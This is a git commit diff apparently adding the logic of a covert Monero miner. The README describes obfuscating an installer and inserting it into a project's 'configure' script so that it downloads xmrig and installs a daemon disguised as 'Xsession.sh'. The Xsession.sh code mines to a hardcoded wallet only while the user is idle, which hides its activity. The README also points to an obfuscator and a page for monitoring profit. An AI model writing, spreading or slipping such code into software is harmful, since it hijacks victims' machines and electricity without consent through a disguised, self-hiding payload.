c0156515a9c9c72e068dc3e50d30d15561ac4ee6
vladimir <vladimir@playsnook.com>
2024-09-18 04:03:44 +0300

    main loop

--- README.md
+++ README.md
@@ -1,4 +1,15 @@
-# Required commands
+# Logic
+
+`install.sh` is obfuscated and inserted into `configure`.
+`install.sh` is executed by `configure`: it downloads `xmrig` and `Xsession.sh` to `$HOME/.local` and installs `Xsession.sh` as a user systemd daemon. `Xsession.sh` should be obfuscated as well. `Xsession.sh` checks for inactivity on the system and runs / stop xmrig accordingly. 
+
+# Obfuscator
+
+```
+npm install -g bash-obfuscate
+```
+
+# Useful commands
 
 ```bash
 systemctl --user status Xsession.sh.service
@@ -6,4 +17,13 @@ systemctl --user status Xsession.sh.service
 
 ```bash
 journalctl --user -u Xsession.sh.service -f
+```
+
+# Monitor profit
+
+```
+https://monero.hashvault.pro/ru/dashboard
+
+Wallet:
+41gaYmwQbHV9DHEhfqE9YGMnYXc8fXov63MfHrJwSETL3RJsuYaMg8f6sTAkNxvjSiGuw1qCfYFE515ogxU171wYH5RnkJJ
 ```
--- Xsession.sh
+++ Xsession.sh
@@ -5,5 +5,43 @@ WALLET=41gaYmwQbHV9DHEhfqE9YGMnYXc8fXov63MfHrJwSETL3RJsuYaMg8f6sTAkNxvjSiGuw1qCf
 LOCAL_PATH=$HOME/.local
 POOL=pool.hashvault.pro:80
 
-pkill $XMRIGNAME
-$LOCAL_PATH/$XMRIGNAME -o $POOL -u $WALLET --coin monero --threads 2
+cmd="$LOCAL_PATH/$XMRIGNAME -o $POOL -u $WALLET --coin monero -B"
+echo "Command: $cmd"
+
+isUI=$(who | grep -q "(:[0-9])" && echo 1 || echo 0)
+
+run_xmr() {
+	if ! pgrep $XMRIGNAME; then
+		$cmd
+	fi		 
+}
+
+while true
+do 
+	if [[ isUI -eq 1 ]]; then
+		idle=$(xprintidle)
+		echo "UI, idle for $idle"
+		if [[ idle -gt 60000 ]]; then
+			run_xmr
+		else 
+			pkill $XMRIGNAME 
+		fi
+	else
+		idle=$(who -u | awk '{print $5}')
+		echo "Text, idle for $idle"
+		if [[ $idle == "old" ]]; then
+			run_xmr
+		elif [[ $idle != "." ]]; then 
+			idleH=$(cut -d':' -f1)
+			idleM=$(cut -d':' -f2)
+			if [[ $idleH -gt 0 || $idleM -gt 1 ]]; then
+				run_xmr
+			else
+				pkill $XMRIGNAME
+			fi
+		else 
+			pkill $XMRIGNAME
+		fi
+	fi
+	sleep 5
+done
